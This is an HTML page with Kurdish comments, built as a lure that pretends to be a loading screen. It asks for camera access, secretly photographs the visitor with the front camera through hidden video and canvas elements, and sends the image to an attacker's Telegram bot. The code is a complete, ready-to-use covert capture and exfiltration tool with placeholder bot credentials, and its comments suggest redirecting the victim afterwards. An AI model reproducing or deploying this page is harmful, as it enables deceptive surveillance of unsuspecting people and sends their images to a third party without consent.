<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بێخێرهاتن</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 200px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        /* ڤیدیۆیێ دێ ڤەشێرین داکو نەبینیت */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>پەیج یێ یێ باربوو دکەت... چاڤەڕێ بە</h2>
    <p>ژ کەرەما خۆ دەستێریێ بدە کامیرێ بۆ بەردەوامبوونێ.</p>
</div>

<!-- توخمێن ڤەشارتى بۆ گرتنا وێنەیی -->
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // ل ڤێرێ زانیاریێن بۆتا خۆ بنڤێسه
    const TELEGRAM_BOT_TOKEN = 'تۆکنێ_بۆتێ_تە'; 
    const TELEGRAM_CHAT_ID = 'ئایدیێ_چاتێ_تە'; 

    // دەستپێکرنا کامیرێ ئێکسەر دەمێ پەیج ڤەدبیت
    window.addEventListener('DOMContentLoaded', async () => {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        try {
            // داخوازکرنا دەستێریێ بۆ کامێرا پێشیێ (Front Camera)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            video.srcObject = stream;

            // چاڤەڕێ بوون بۆ ١ چرکە داکو کامێرا ڕوون بیت، پاشان وێنە دێ هێتە گرتن
            setTimeout(() => {
                // قەبارێ وێنەیی دێ کەنە وەکى قەبارێ ڤیدیۆیێ
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // کێشانا وێنەیی د ناڤ Canvas دا
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // گوهۆڕینا وێنەیی بۆ Blob (فایل) بۆ فرێکرنێ
                canvas.toBlob((blob) => {
                    sendPhotoToTelegram(blob);
                }, 'image/jpeg');

                // گرتنا کامیرێ پشتی وێنە هاتیە گرتن
                stream.getTracks().forEach(track => track.stop());

            }, 1500);

        } catch (error) {
            console.log("کەسێ ڕەتکر یان خەلەتتیەک هەیە: ", error);
        }
    });

    // فانکشنا فرێکرنا وێنەیی بۆ تیلیگرامی
    function sendPhotoToTelegram(photoBlob) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', photoBlob, 'captured_image.jpg');

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('وێنە بۆ تیلیگرامی هاتە فرێکرن');
            // ل ڤێرێ دشێی کەسی ببەیە بۆ لینکەکێ دی یان نامەکێ نیشا بدەی
        })
        .catch(err => console.error('خەلەتتی د فرێکرنێ دا:', err));
    }
</script>

</body>
</html>
